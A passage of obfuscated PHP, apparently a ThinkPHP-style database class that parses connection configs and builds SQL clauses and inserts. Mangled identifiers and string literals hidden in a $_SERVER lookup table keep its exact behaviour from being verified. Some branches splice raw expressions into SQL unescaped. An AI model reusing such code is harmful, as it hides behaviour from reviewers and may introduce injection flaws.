public function factory($ˆİ²›µ = '') { $“ğ‚íí™ =& $_SERVER[‚ûòÉ˜ş]; $ˆİ²›µ = $this->parseConfig($ˆİ²›µ); if (empty($ˆİ²›µ[$“ğ‚íí™[1002]])) { think_exception(think_lang($“ğ‚íí™[1003])); } $this->dbType = ucwords(strtolower($ˆİ²›µ[$“ğ‚íí™[1002]])); $Â·™¤Öä = $“ğ‚íí™[1004] . $this->dbType; if (class_exists($Â·™¤Öä)) { $ÚÓ¡Ä†Ÿ = new $Â·™¤Öä($ˆİ²›µ); if ($“ğ‚íí™[1005] != strtolower($ˆİ²›µ[$“ğ‚íí™[1002]])) { $ÚÓ¡Ä†Ÿ->dbType = strtoupper($this->dbType); } else { $ÚÓ¡Ä†Ÿ->dbType = $this->_getDsnType($ˆİ²›µ[$“ğ‚íí™[957]]); } } else { think_exception(think_lang($“ğ‚íí™[1006]) . $“ğ‚íí™[1007] . $Â·™¤Öä); } return $ÚÓ¡Ä†Ÿ; } public function __call($ù‹Æ€àã, $öò¡ƒš) { if (method_exists($this, $ù‹Æ€àã)) { return call_user_func_array(array($this, $ù‹Æ€àã), $öò¡ƒš); } } protected function _getDsnType($îÁ™í²Ğ) { $äéığÀ = explode($_SERVER[‚ûòÉ˜ş][4], $îÁ™í²Ğ); $óà¶íÇ» = strtoupper(trim($äéığÀ[0])); return $óà¶íÇ»; } private function parseConfig($³Ç¥ôåï = '') { $Ê”ü³Ãï =& $_SERVER[‚ûòÉ˜ş]; if (!empty($³Ç¥ôåï) && is_string($³Ç¥ôåï)) { $³Ç¥ôåï = $this->parseDSN($³Ç¥ôåï); } elseif (is_array($³Ç¥ôåï)) { $³Ç¥ôåï = array_change_key_case($³Ç¥ôåï); $³Ç¥ôåï = array($Ê”ü³Ãï[1002] => $³Ç¥ôåï[$Ê”ü³Ãï[1008]], $Ê”ü³Ãï[928] => $³Ç¥ôåï[$Ê”ü³Ãï[1009]], $Ê”ü³Ãï[929] => $³Ç¥ôåï[$Ê”ü³Ãï[1010]], $Ê”ü³Ãï[926] => $³Ç¥ôåï[$Ê”ü³Ãï[1011]], $Ê”ü³Ãï[927] => $³Ç¥ôåï[$Ê”ü³Ãï[1012]], $Ê”ü³Ãï[31] => $³Ç¥ôåï[$Ê”ü³Ãï[1013]], $Ê”ü³Ãï[957] => $³Ç¥ôåï[$Ê”ü³Ãï[1014]], $Ê”ü³Ãï[27] => isset($³Ç¥ôåï[$Ê”ü³Ãï[1015]]) ? $³Ç¥ôåï[$Ê”ü³Ãï[1015]] : array()); } elseif (empty($³Ç¥ôåï)) { if (think_config($Ê”ü³Ãï[1016]) && $Ê”ü³Ãï[1005] != strtolower(think_config($Ê”ü³Ãï[1017]))) { $³Ç¥ôåï = $this->parseDSN(think_config($Ê”ü³Ãï[1016])); } else { $³Ç¥ôåï = array($Ê”ü³Ãï[1002] => think_config($Ê”ü³Ãï[1017]), $Ê”ü³Ãï[928] => think_config($Ê”ü³Ãï[1018]), $Ê”ü³Ãï[929] => think_config($Ê”ü³Ãï[1019]), $Ê”ü³Ãï[926] => think_config($Ê”ü³Ãï[1020]), $Ê”ü³Ãï[927] => think_config($Ê”ü³Ãï[1021]), $Ê”ü³Ãï[31] => think_config($Ê”ü³Ãï[299]), $Ê”ü³Ãï[957] => think_config($Ê”ü³Ãï[1016]), $Ê”ü³Ãï[27] => think_config($Ê”ü³Ãï[1022])); } } return $³Ç¥ôåï; } protected function initConnect($Ÿ€´ î = true) { if (1 == think_config($_SERVER[‚ûòÉ˜ş][32])) { $this->_linkID = $this->multiConnect($Ÿ€´ î); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ŞıŒ¾°ß => $×ù“áÃú) { $this->_linkID = $×ù“áÃú; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($§Á§›ô· = false) { $‡ïœõ¡ =& $_SERVER[‚ûòÉ˜ş]; static $ÛØèçÄü = array(); static $ãĞÏá© = -1; if (empty($ÛØèçÄü)) { foreach ($this->config as $¨„õ‰®… => $ÕÇ—…‘ê) { $ÛØèçÄü[$¨„õ‰®…] = explode($‡ïœõ¡[60], $ÕÇ—…‘ê); } } if (think_config($‡ïœõ¡[1023])) { if ($§Á§›ô· || think_config($‡ïœõ¡[447]) === !0) { $Ş¦âù¤‡ = floor(mt_rand(0, think_config($‡ïœõ¡[1024]) - 1)); $ãĞÏá© = $Ş¦âù¤‡; } else { if (is_numeric(think_config($‡ïœõ¡[1025]))) { $Ş¦âù¤‡ = think_config($‡ïœõ¡[1025]); } else { $Ş¦âù¤‡ = floor(mt_rand(think_config($‡ïœõ¡[1024]), count($ÛØèçÄü[$‡ïœõ¡[926]]) - 1)); } } } else { $Ş¦âù¤‡ = floor(mt_rand(0, count($ÛØèçÄü[$‡ïœõ¡[926]]) - 1)); $ãĞÏá© = $Ş¦âù¤‡; } $Ş¦âù¤‡ = $ãĞÏá© !== -1 ? $ãĞÏá© : $Ş¦âù¤‡; $™ı¿ØË = array($‡ïœõ¡[928] => isset($ÛØèçÄü[$‡ïœõ¡[928]][$Ş¦âù¤‡]) ? $ÛØèçÄü[$‡ïœõ¡[928]][$Ş¦âù¤‡] : $ÛØèçÄü[$‡ïœõ¡[928]][0], $‡ïœõ¡[929] => isset($ÛØèçÄü[$‡ïœõ¡[929]][$Ş¦âù¤‡]) ? $ÛØèçÄü[$‡ïœõ¡[929]][$Ş¦âù¤‡] : $ÛØèçÄü[$‡ïœõ¡[929]][0], $‡ïœõ¡[926] => isset($ÛØèçÄü[$‡ïœõ¡[926]][$Ş¦âù¤‡]) ? $ÛØèçÄü[$‡ïœõ¡[926]][$Ş¦âù¤‡] : $ÛØèçÄü[$‡ïœõ¡[926]][0], $‡ïœõ¡[927] => isset($ÛØèçÄü[$‡ïœõ¡[927]][$Ş¦âù¤‡]) ? $ÛØèçÄü[$‡ïœõ¡[927]][$Ş¦âù¤‡] : $ÛØèçÄü[$‡ïœõ¡[927]][0], $‡ïœõ¡[31] => isset($ÛØèçÄü[$‡ïœõ¡[31]][$Ş¦âù¤‡]) ? $ÛØèçÄü[$‡ïœõ¡[31]][$Ş¦âù¤‡] : $ÛØèçÄü[$‡ïœõ¡[31]][0], $‡ïœõ¡[957] => isset($ÛØèçÄü[$‡ïœõ¡[957]][$Ş¦âù¤‡]) ? $ÛØèçÄü[$‡ïœõ¡[957]][$Ş¦âù¤‡] : $ÛØèçÄü[$‡ïœõ¡[957]][0], $‡ïœõ¡[27] => isset($ÛØèçÄü[$‡ïœõ¡[27]][$Ş¦âù¤‡]) ? $ÛØèçÄü[$‡ïœõ¡[27]][$Ş¦âù¤‡] : $ÛØèçÄü[$‡ïœõ¡[27]][0]); return $this->connect($™ı¿ØË, $Ş¦âù¤‡); } public function parseDSN($ßğºöÊ) { $¸àÇ¼•ı =& $_SERVER[‚ûòÉ˜ş]; if (empty($ßğºöÊ)) { return !1; } $¢†äÌ•â = parse_url($ßğºöÊ); if ($¢†äÌ•â[$¸àÇ¼•ı[205]]) { $‰Ó½øÃÇ = array($¸àÇ¼•ı[1002] => $¢†äÌ•â[$¸àÇ¼•ı[205]], $¸àÇ¼•ı[928] => isset($¢†äÌ•â[$¸àÇ¼•ı[638]]) ? $¢†äÌ•â[$¸àÇ¼•ı[638]] : $¸àÇ¼•ı[12], $¸àÇ¼•ı[929] => isset($¢†äÌ•â[$¸àÇ¼•ı[1026]]) ? $¢†äÌ•â[$¸àÇ¼•ı[1026]] : $¸àÇ¼•ı[12], $¸àÇ¼•ı[926] => isset($¢†äÌ•â[$¸àÇ¼•ı[206]]) ? $¢†äÌ•â[$¸àÇ¼•ı[206]] : $¸àÇ¼•ı[12], $¸àÇ¼•ı[927] => isset($¢†äÌ•â[$¸àÇ¼•ı[207]]) ? $¢†äÌ•â[$¸àÇ¼•ı[207]] : $¸àÇ¼•ı[12], $¸àÇ¼•ı[31] => isset($¢†äÌ•â[$¸àÇ¼•ı[94]]) ? substr($¢†äÌ•â[$¸àÇ¼•ı[94]], 1) : $¸àÇ¼•ı[12]); } else { preg_match($¸àÇ¼•ı[1027], trim($ßğºöÊ), $İìÈÛ«­); $‰Ó½øÃÇ = array($¸àÇ¼•ı[1002] => $İìÈÛ«­[1], $¸àÇ¼•ı[928] => $İìÈÛ«­[2], $¸àÇ¼•ı[929] => $İìÈÛ«­[3], $¸àÇ¼•ı[926] => $İìÈÛ«­[4], $¸àÇ¼•ı[927] => $İìÈÛ«­[5], $¸àÇ¼•ı[31] => $İìÈÛ«­[6]); } $‰Ó½øÃÇ[$¸àÇ¼•ı[957]] = $¸àÇ¼•ı[12]; return $‰Ó½øÃÇ; } protected function debug() { $–®¨“ò =& $_SERVER[‚ûòÉ˜ş]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $–®¨“ò[1028]; if (think_config($–®¨“ò[1029])) { think_status($–®¨“ò[1030]); think_trace($this->queryStr . $–®¨“ò[1031] . think_status($–®¨“ò[34], $–®¨“ò[1030], 6) . $–®¨“ò[1032], $–®¨“ò[12], $–®¨“ò[1033]); } } protected function parseLock($íÏ›‘ÑÖ = false) { $¼…®šşË =& $_SERVER[‚ûòÉ˜ş]; if (!$íÏ›‘ÑÖ) { return $¼…®šşË[12]; } if ($¼…®šşË[959] == $this->dbType) { return $¼…®šşË[1034]; } return $¼…®šşË[1035]; } protected function parseSet($óìÆÄ¾·) { $Å©Ğ×ñ =& $_SERVER[‚ûòÉ˜ş]; foreach ($óìÆÄ¾· as $ì§õåÃ => $‡ãµ‹) { if (is_array($‡ãµ‹) && $Å©Ğ×ñ[350] == $‡ãµ‹[0]) { $÷§‚š¬ê[] = $this->parseKey($ì§õåÃ) . $Å©Ğ×ñ[924] . $‡ãµ‹[1]; } elseif (is_scalar($‡ãµ‹) || is_null($‡ãµ‹)) { $÷§‚š¬ê[] = $this->parseKey($ì§õåÃ) . $Å©Ğ×ñ[924] . $this->parseValue($‡ãµ‹); } } return $Å©Ğ×ñ[1036] . implode($Å©Ğ×ñ[60], $÷§‚š¬ê); } protected function bindParam($Ôî°à£ê, $å÷ü‚…“) { $this->bind[$_SERVER[‚ûòÉ˜ş][4] . $Ôî°à£ê] = $å÷ü‚…“; } protected function parseBind($İîø¥ˆå) { $İîø¥ˆå = array_merge($this->bind, $İîø¥ˆå); $this->bind = array(); return $İîø¥ˆå; } function parseKey(&$ÔÎ¦îŠ, $´·ÖÖÀí = true) { if ($´·ÖÖÀí) { $ÔÎ¦îŠ = $this->parseKeyCheck($ÔÎ¦îŠ); } return $ÔÎ¦îŠ; } function parseKeyCheck($È£›ßò§) { $ø§İÜè† =& $_SERVER[‚ûòÉ˜ş]; $È£›ßò§ = trim($È£›ßò§); if (!preg_match($ø§İÜè†[1037], $È£›ßò§)) { think_exception($ø§İÜè†[1038] . $È£›ßò§); } return $È£›ßò§; } protected function parseValue($ˆÊ€æñò) { $¯²Ê´ŞÂ =& $_SERVER[‚ûòÉ˜ş]; if (is_string($ˆÊ€æñò)) { $ˆÊ€æñò = $¯²Ê´ŞÂ[998] . $this->escapeString($ˆÊ€æñò) . $¯²Ê´ŞÂ[998]; } elseif (isset($ˆÊ€æñò[0]) && is_string($ˆÊ€æñò[0]) && strtolower($ˆÊ€æñò[0]) == $¯²Ê´ŞÂ[350]) { $ˆÊ€æñò = $this->escapeString($ˆÊ€æñò[1]); } elseif (is_array($ˆÊ€æñò)) { $ˆÊ€æñò = array_map(array($this, $¯²Ê´ŞÂ[999]), $ˆÊ€æñò); } elseif (is_bool($ˆÊ€æñò)) { $ˆÊ€æñò = $ˆÊ€æñò ? $¯²Ê´ŞÂ[98] : $¯²Ê´ŞÂ[222]; } elseif (is_null($ˆÊ€æñò)) { $ˆÊ€æñò = $¯²Ê´ŞÂ[113]; } return $ˆÊ€æñò; } protected function parseField($•÷÷¦£Ô) { $€êàÅÄã =& $_SERVER[‚ûòÉ˜ş]; if (is_string($•÷÷¦£Ô) && strpos($•÷÷¦£Ô, $€êàÅÄã[60])) { $•÷÷¦£Ô = explode($€êàÅÄã[60], $•÷÷¦£Ô); } if (is_array($•÷÷¦£Ô)) { $õâ¥²Ñß = array(); foreach ($•÷÷¦£Ô as $İŸÚ©ÁÆ => $ºÈ¦ñ‚ƒ) { if (!is_numeric($İŸÚ©ÁÆ)) { $õâ¥²Ñß[] = $this->parseKey($İŸÚ©ÁÆ, !1) . $€êàÅÄã[1039] . $this->parseKey($ºÈ¦ñ‚ƒ); } else { $õâ¥²Ñß[] = $this->parseKey($ºÈ¦ñ‚ƒ); } } $±Éôæ—§ = implode($€êàÅÄã[60], $õâ¥²Ñß); } elseif (is_string($•÷÷¦£Ô) && !empty($•÷÷¦£Ô)) { $±Éôæ—§ = $•÷÷¦£Ô; } else { $±Éôæ—§ = $€êàÅÄã[213]; } return $±Éôæ—§; } protected function parseTable($ßê„î®ë) { $—¯‘şş´ =& $_SERVER[‚ûòÉ˜ş]; if (is_array($ßê„î®ë)) { $È¦Ÿı­ = array(); foreach ($ßê„î®ë as $ˆ×ı™—Ş => $šÇ„ å) { if (!is_numeric($ˆ×ı™—Ş)) { $È¦Ÿı­[] = $this->parseKey($ˆ×ı™—Ş) . $—¯‘şş´[63] . $this->parseKey($šÇ„ å); } else { $È¦Ÿı­[] = $this->parseKey($ˆ×ı™—Ş); } } $ßê„î®ë = $È¦Ÿı­; } elseif (is_string($ßê„î®ë)) { if (strstr($ßê„î®ë, $—¯‘şş´[63])) { return $ßê„î®ë; } $ßê„î®ë = explode($—¯‘şş´[60], $ßê„î®ë); array_walk($ßê„î®ë, array($this, $—¯‘şş´[946])); } return $—¯‘şş´[940] . trim(implode($—¯‘şş´[1040], $ßê„î®ë), $—¯‘şş´[437]) . $—¯‘şş´[940]; } protected function parseWhere($´üŒ“’) { $¦ëªŸŒ® =& $_SERVER[‚ûòÉ˜ş]; $øÑ¬§¢† = $¦ëªŸŒ®[12]; if (is_string($´üŒ“’)) { $øÑ¬§¢† = $´üŒ“’; } else { $¯–Ÿï†Ö = isset($´üŒ“’[$¦ëªŸŒ®[1041]]) ? strtoupper($´üŒ“’[$¦ëªŸŒ®[1041]]) : $¦ëªŸŒ®[12]; if (in_array($¯–Ÿï†Ö, array($¦ëªŸŒ®[1042], $¦ëªŸŒ®[1043], $¦ëªŸŒ®[1044]))) { $¯–Ÿï†Ö = $¦ëªŸŒ®[63] . $¯–Ÿï†Ö . $¦ëªŸŒ®[63]; unset($´üŒ“’[$¦ëªŸŒ®[1041]]); } else { $¯–Ÿï†Ö = $¦ëªŸŒ®[1045]; } foreach ($´üŒ“’ as $¤É›»± => $òÈÑÆ¹´) { $øÑ¬§¢† .= $¦ëªŸŒ®[330]; if (is_numeric($¤É›»±)) { $¤É›»± = $¦ëªŸŒ®[1046]; } if (0 === strpos($¤É›»±, $¦ëªŸŒ®[11])) { $øÑ¬§¢† .= $this->parseThinkWhere($¤É›»±, $òÈÑÆ¹´); } else { if (!preg_match($¦ëªŸŒ®[1047], trim($¤É›»±))) { think_exception(think_lang($¦ëªŸŒ®[1048]) . $¦ëªŸŒ®[4] . $¤É›»±); } $ƒ¶‡ô‚ = is_array($òÈÑÆ¹´) && isset($òÈÑÆ¹´[$¦ëªŸŒ®[1049]]); $¤É›»± = trim($¤É›»±); if (strpos($¤É›»±, $¦ëªŸŒ®[336])) { $„¸¿à = explode($¦ëªŸŒ®[336], $¤É›»±); $éÁ‡¦úì = array(); foreach ($„¸¿à as $ºƒ¸‘ˆÚ => $ãŞÄÏ) { $³íşáÙƒ = $ƒ¶‡ô‚ ? $òÈÑÆ¹´[$ºƒ¸‘ˆÚ] : $òÈÑÆ¹´; $éÁ‡¦úì[] = $¦ëªŸŒ®[313] . $this->parseWhereItem($this->parseKey($ãŞÄÏ), $³íşáÙƒ) . $¦ëªŸŒ®[945]; } $øÑ¬§¢† .= implode($¦ëªŸŒ®[1050], $éÁ‡¦úì); } elseif (strpos($¤É›»±, $¦ëªŸŒ®[337])) { $„¸¿à = explode($¦ëªŸŒ®[337], $¤É›»±); $éÁ‡¦úì = array(); foreach ($„¸¿à as $ºƒ¸‘ˆÚ => $ãŞÄÏ) { $³íşáÙƒ = $ƒ¶‡ô‚ ? $òÈÑÆ¹´[$ºƒ¸‘ˆÚ] : $òÈÑÆ¹´; $éÁ‡¦úì[] = $¦ëªŸŒ®[313] . $this->parseWhereItem($this->parseKey($ãŞÄÏ), $³íşáÙƒ) . $¦ëªŸŒ®[945]; } $øÑ¬§¢† .= implode($¦ëªŸŒ®[1045], $éÁ‡¦úì); } else { $øÑ¬§¢† .= $this->parseWhereItem($this->parseKey($¤É›»±), $òÈÑÆ¹´); } } $øÑ¬§¢† .= $¦ëªŸŒ®[331] . $¯–Ÿï†Ö; } $øÑ¬§¢† = substr($øÑ¬§¢†, 0, -strlen($¯–Ÿï†Ö)); } return empty($øÑ¬§¢†) ? $¦ëªŸŒ®[12] : $¦ëªŸŒ®[1051] . $øÑ¬§¢†; } protected function parseWhereItem($’Ëªíˆ, $î£şº˜) { $¹‹ã¯…ò =& $_SERVER[‚ûòÉ˜ş]; $¶ëà»â = $¹‹ã¯…ò[12]; if (is_array($î£şº˜)) { if (is_string($î£şº˜[0])) { $œ¦®áŸ¼ = strtolower($î£şº˜[0]); if (in_array($î£şº˜[0], array($¹‹ã¯…ò[924], $¹‹ã¯…ò[1052], $¹‹ã¯…ò[1053], $¹‹ã¯…ò[1054], $¹‹ã¯…ò[1055], $¹‹ã¯…ò[1056]))) { $¶ëà»â .= $’Ëªíˆ . $¹‹ã¯…ò[63] . $î£şº˜[0] . $¹‹ã¯…ò[63] . $this->parseValue($î£şº˜[1]); } elseif (preg_match($¹‹ã¯…ò[1057], $î£şº˜[0])) { $¶ëà»â .= $’Ëªíˆ . $¹‹ã¯…ò[63] . $this->exp[$œ¦®áŸ¼] . $¹‹ã¯…ò[63] . $this->parseValue($î£şº˜[1]); } elseif (preg_match($¹‹ã¯…ò[1058], $î£şº˜[0])) { if (is_array($î£şº˜[1])) { $ä½Äê®ç = isset($î£şº˜[2]) ? strtoupper($î£şº˜[2]) : $¹‹ã¯…ò[1043]; if (in_array($ä½Äê®ç, array($¹‹ã¯…ò[1042], $¹‹ã¯…ò[1043], $¹‹ã¯…ò[1044]))) { $“€Ö¶¢Ü = array(); foreach ($î£şº˜[1] as $àø‡Ø¿–) { $“€Ö¶¢Ü[] = $’Ëªíˆ . $¹‹ã¯…ò[63] . $this->exp[$œ¦®áŸ¼] . $¹‹ã¯…ò[63] . $this->parseValue($àø‡Ø¿–); } $¶ëà»â .= $¹‹ã¯…ò[313] . implode($¹‹ã¯…ò[63] . $ä½Äê®ç . $¹‹ã¯…ò[63], $“€Ö¶¢Ü) . $¹‹ã¯…ò[945]; } } else { $¶ëà»â .= $’Ëªíˆ . $¹‹ã¯…ò[63] . $this->exp[$œ¦®áŸ¼] . $¹‹ã¯…ò[63] . $this->parseValue($î£şº˜[1]); } } elseif ($¹‹ã¯…ò[350] == $œ¦®áŸ¼) { $¶ëà»â .= $¹‹ã¯…ò[943] . $’Ëªíˆ . $¹‹ã¯…ò[63] . $î£şº˜[1] . $¹‹ã¯…ò[1059]; } elseif (preg_match($¹‹ã¯…ò[1060], $î£şº˜[0])) { $¶ëà»â .= $î£şº˜[0]; } elseif (preg_match($¹‹ã¯…ò[1061], $î£şº˜[0])) { if (isset($î£şº˜[2]) && $¹‹ã¯…ò[350] == $î£şº˜[2]) { $¶ëà»â .= $’Ëªíˆ . $¹‹ã¯…ò[63] . $this->exp[$œ¦®áŸ¼] . $¹‹ã¯…ò[63] . $î£şº˜[1]; } else { if (is_string($î£şº˜[1])) { $î£şº˜[1] = explode($¹‹ã¯…ò[60], $î£şº˜[1]); } $Ã¹çËä  = implode($¹‹ã¯…ò[60], $this->parseValue($î£şº˜[1])); $¶ëà»â .= $’Ëªíˆ . $¹‹ã¯…ò[63] . $this->exp[$œ¦®áŸ¼] . $¹‹ã¯…ò[943] . $Ã¹çËä  . $¹‹ã¯…ò[945]; } } elseif (preg_match($¹‹ã¯…ò[1062], $î£şº˜[0])) { $æ¸ÏÜÁ’ = is_string($î£şº˜[1]) ? explode($¹‹ã¯…ò[60], $î£şº˜[1]) : $î£şº˜[1]; $¶ëà»â .= $¹‹ã¯…ò[943] . $’Ëªíˆ . $¹‹ã¯…ò[63] . $this->exp[$œ¦®áŸ¼] . $¹‹ã¯…ò[63] . $this->parseValue($æ¸ÏÜÁ’[0]) . $¹‹ã¯…ò[1045] . $this->parseValue($æ¸ÏÜÁ’[1]) . $¹‹ã¯…ò[331]; } else { think_exception(think_lang($¹‹ã¯…ò[1048]) . $¹‹ã¯…ò[4] . $î£şº˜[0]); } } else { $’Á”‡Îû = count($î£şº˜); $íêÒ®¤­ = $¹‹ã¯…ò[12]; if (is_string($î£şº˜[$’Á”‡Îû - 1])) { $íêÒ®¤­ = isset($î£şº˜[$’Á”‡Îû - 1]) ? strtoupper($î£şº˜[$’Á”‡Îû - 1]) : $¹‹ã¯…ò[12]; if (in_array($íêÒ®¤­, array($¹‹ã¯…ò[1042], $¹‹ã¯…ò[1043], $¹‹ã¯…ò[1044]))) { $’Á”‡Îû = $’Á”‡Îû - 1; } } else { $íêÒ®¤­ = $¹‹ã¯…ò[1042]; } for ($ˆŠıÏ¾ = 0; $ˆŠıÏ¾ < $’Á”‡Îû; $ˆŠıÏ¾++) { $æ¸ÏÜÁ’ = is_array($î£şº˜[$ˆŠıÏ¾]) ? $î£şº˜[$ˆŠıÏ¾][1] : $î£şº˜[$ˆŠıÏ¾]; if ($¹‹ã¯…ò[350] == strtolower($î£şº˜[$ˆŠıÏ¾][0])) { $¶ëà»â .= $¹‹ã¯…ò[313] . $’Ëªíˆ . $¹‹ã¯…ò[63] . $æ¸ÏÜÁ’ . $¹‹ã¯…ò[1059] . $íêÒ®¤­ . $¹‹ã¯…ò[63]; } else { $²ñ–ß« = is_array($î£şº˜[$ˆŠıÏ¾]) ? $this->exp[strtolower($î£şº˜[$ˆŠıÏ¾][0])] : $¹‹ã¯…ò[924]; if (!$²ñ–ß« && is_array($î£şº˜[$ˆŠıÏ¾]) && in_array($î£şº˜[$ˆŠıÏ¾][0], array($¹‹ã¯…ò[924], $¹‹ã¯…ò[1052], $¹‹ã¯…ò[1053], $¹‹ã¯…ò[1054], $¹‹ã¯…ò[1055], $¹‹ã¯…ò[1056]))) { $²ñ–ß« = $î£şº˜[$ˆŠıÏ¾][0]; } $¶ëà»â .= $¹‹ã¯…ò[313] . $’Ëªíˆ . $¹‹ã¯…ò[63] . $²ñ–ß« . $¹‹ã¯…ò[63] . $this->parseValue($æ¸ÏÜÁ’) . $¹‹ã¯…ò[1059] . $íêÒ®¤­ . $¹‹ã¯…ò[63]; } } $¶ëà»â = substr($¶ëà»â, 0, -4); } } else { $¶ëà»â .= $’Ëªíˆ . $¹‹ã¯…ò[1063] . $this->parseValue($î£şº˜); } return $¶ëà»â; } protected function parseThinkWhere($îà”ßìÕ, $ß§Æ‰Èô) { $Œ‚ğ‡§¦ =& $_SERVER[‚ûòÉ˜ş]; $ó¯ËĞ¨Ù = $Œ‚ğ‡§¦[12]; switch ($îà”ßìÕ) { case $Œ‚ğ‡§¦[405]: $ó¯ËĞ¨Ù = $ß§Æ‰Èô; break; case $Œ‚ğ‡§¦[1046]: $ó¯ËĞ¨Ù = is_string($ß§Æ‰Èô) ? $ß§Æ‰Èô : substr($this->parseWhere($ß§Æ‰Èô), 6); break; case $Œ‚ğ‡§¦[1064]: parse_str($ß§Æ‰Èô, $¼‘²ô’); if (isset($¼‘²ô’[$Œ‚ğ‡§¦[1041]])) { $ÃçŠ†— = $Œ‚ğ‡§¦[63] . strtoupper($¼‘²ô’[$Œ‚ğ‡§¦[1041]]) . $Œ‚ğ‡§¦[63]; unset($¼‘²ô’[$Œ‚ğ‡§¦[1041]]); } else { $ÃçŠ†— = $Œ‚ğ‡§¦[1045]; } $Ó¼Ìû”¼ = array(); foreach ($¼‘²ô’ as $º¥úˆÒƒ => $ÈñÛ’·±) { $Ó¼Ìû”¼[] = $this->parseKey($º¥úˆÒƒ) . $Œ‚ğ‡§¦[1063] . $this->parseValue($ÈñÛ’·±); } $ó¯ËĞ¨Ù = implode($ÃçŠ†—, $Ó¼Ìû”¼); break; } return $ó¯ËĞ¨Ù; } protected function parseLimit($Ğ€•½Ûº) { $ˆÍùöé =& $_SERVER[‚ûòÉ˜ş]; return !empty($Ğ€•½Ûº) ? $ˆÍùöé[61] . $Ğ€•½Ûº . $ˆÍùöé[63] : $ˆÍùöé[12]; } protected function parseJoin($şÀ€—ï) { $Å€¸—‹ =& $_SERVER[‚ûòÉ˜ş]; $ó†ö›Š = $Å€¸—‹[12]; if (!empty($şÀ€—ï)) { if (is_array($şÀ€—ï)) { foreach ($şÀ€—ï as $øæéû¥ => $ÊçêÛ) { if (!1 !== stripos($ÊçêÛ, $Å€¸—‹[1065])) { $ó†ö›Š .= $Å€¸—‹[63] . $ÊçêÛ; } else { $ó†ö›Š .= $Å€¸—‹[1066] . $ÊçêÛ; } } } else { $ó†ö›Š .= $Å€¸—‹[1066] . $şÀ€—ï; } } $ó†ö›Š = preg_replace($Å€¸—‹[1067], think_config($Å€¸—‹[971]) . $Å€¸—‹[1068], $ó†ö›Š); return $ó†ö›Š; } protected function parseOrder($²œÉóü) { $¸°ÊâãŠ =& $_SERVER[‚ûòÉ˜ş]; if (is_array($²œÉóü)) { $£¤¸Ä£ = array(); foreach ($²œÉóü as $••¼‚Ğ” => $›—Š›¦å) { if (is_numeric($••¼‚Ğ”)) { $£¤¸Ä£[] = $this->parseKey($›—Š›¦å); } else { $›—Š›¦å = in_array(strtoupper(trim($›—Š›¦å)), array($¸°ÊâãŠ[1069], $¸°ÊâãŠ[1070])) ? $¸°ÊâãŠ[63] . $›—Š›¦å : $¸°ÊâãŠ[12]; if (preg_match($¸°ÊâãŠ[1071], $••¼‚Ğ”)) { $£¤¸Ä£[] = $this->parseKey($••¼‚Ğ”) . $›—Š›¦å; } else { think_exception($¸°ÊâãŠ[1072] . $••¼‚Ğ”); } } } $²œÉóü = implode($¸°ÊâãŠ[60], $£¤¸Ä£); } return !empty($²œÉóü) ? $¸°ÊâãŠ[1073] . $²œÉóü : $¸°ÊâãŠ[12]; } protected function parseGroup($û‚äÄØ) { $Ğë¹Šüî =& $_SERVER[‚ûòÉ˜ş]; return !empty($û‚äÄØ) ? $Ğë¹Šüî[1074] . $û‚äÄØ : $Ğë¹Šüî[12]; } protected function parseHaving($Ñ£†¸¾Â) { $°ãÔõàó =& $_SERVER[‚ûòÉ˜ş]; return !empty($Ñ£†¸¾Â) ? $°ãÔõàó[1075] . $Ñ£†¸¾Â : $°ãÔõàó[12]; } protected function parseComment($£ß·…Ò) { $ßÊÈ€½Ú =& $_SERVER[‚ûòÉ˜ş]; return !empty($£ß·…Ò) ? $ßÊÈ€½Ú[1076] . $£ß·…Ò . $ßÊÈ€½Ú[1077] : $ßÊÈ€½Ú[12]; } protected function parseDistinct($õÕ³ßœ²) { $Ğ±ªûÜ¸ =& $_SERVER[‚ûòÉ˜ş]; return !empty($õÕ³ßœ²) ? $Ğ±ªûÜ¸[1078] : $Ğ±ªûÜ¸[12]; } protected function parseUnion($ŸÅÚô„Ë) { $ññ‘âĞ =& $_SERVER[‚ûòÉ˜ş]; if (empty($ŸÅÚô„Ë)) { return $ññ‘âĞ[12]; } if (isset($ŸÅÚô„Ë[$ññ‘âĞ[401]])) { $¹îä®÷Ô = $ññ‘âĞ[1079]; unset($ŸÅÚô„Ë[$ññ‘âĞ[401]]); } else { $¹îä®÷Ô = $ññ‘âĞ[1080]; } foreach ($ŸÅÚô„Ë as $¹Š”ĞŞ¬) { $Ü¹ÛòÄó[] = $¹îä®÷Ô . (is_array($¹Š”ĞŞ¬) ? $this->buildSelectSql($¹Š”ĞŞ¬) : $¹Š”ĞŞ¬); } return implode($ññ‘âĞ[63], $Ü¹ÛòÄó); } public function insert($—éÂü¸À, $î‘º›Ú = array(), $ËÇ»Ûşß = false) { $‚±ûÑÓ =& $_SERVER[‚ûòÉ˜ş]; $¯å¼ª¶ = $öÔÎôš = array(); $this->model = $î‘º›Ú[$‚±ûÑÓ[334]]; foreach ($—éÂü¸À as $ÈÎş‹¢‰ => $Ç×ÇÛŸÎ) { if (is_array($Ç×ÇÛŸÎ) && $‚±ûÑÓ[350] == $Ç×ÇÛŸÎ[0]) { $öÔÎôš[] = $this->parseKey($ÈÎş‹¢‰); $¯å¼ª¶[] = $Ç×ÇÛŸÎ[1]; } elseif (is_scalar($Ç×ÇÛŸÎ) || is_null($Ç×ÇÛŸÎ)) { $öÔÎôš[] = $this->parseKey($ÈÎş‹¢‰); $¯å¼ª¶[] = $this->parseValue($Ç×ÇÛŸÎ); } } $³œàÈ¦ = ($ËÇ»Ûşß ? $‚±ûÑÓ[947] : $‚±ûÑÓ[948]) . $‚±ûÑÓ[949] . $this->parseTable($î‘º›Ú[$‚±ûÑÓ[332]]) . $‚±ûÑÓ[943] . implode($‚±ûÑÓ[60], $öÔÎôš) . $‚±ûÑÓ[944] . implode($‚±ûÑÓ[60], $¯å¼ª¶) . $‚±ûÑÓ[945]; $³œàÈ¦ .= $this->parseLock(isset($î‘º›Ú[$‚±ûÑÓ[884]]) ? $î‘º›Ú[$‚±ûÑÓ[884]] : !1); $³œàÈ¦ .= $this->parseComment(!empty($î‘º›Ú[$‚±ûÑÓ[407]]) ? $î‘º›Ú[$‚±ûÑÓ[407]] : $‚±ûÑÓ[12]); 